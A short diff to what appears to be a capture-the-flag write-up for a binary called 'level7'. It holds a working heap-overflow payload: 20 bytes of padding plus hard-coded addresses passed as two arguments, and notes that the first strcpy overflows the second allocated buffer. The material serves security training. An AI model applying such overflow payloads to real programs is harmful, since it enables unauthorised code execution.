@@ -1,4 +1,4 @@
-$(python -c "print('A'*20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
+./level7 $(python -c "print('A'*20 + '\x28\x99\x04\x08')") $(python -c "print('\xf4\x84\x04\x08')")
 
 1. The program runs 2 mallocs and 2 strcpy (simplified)
 2. We can overflow the the 2nd alloc'd area with the first strcpy by giving the good offset to the first arg
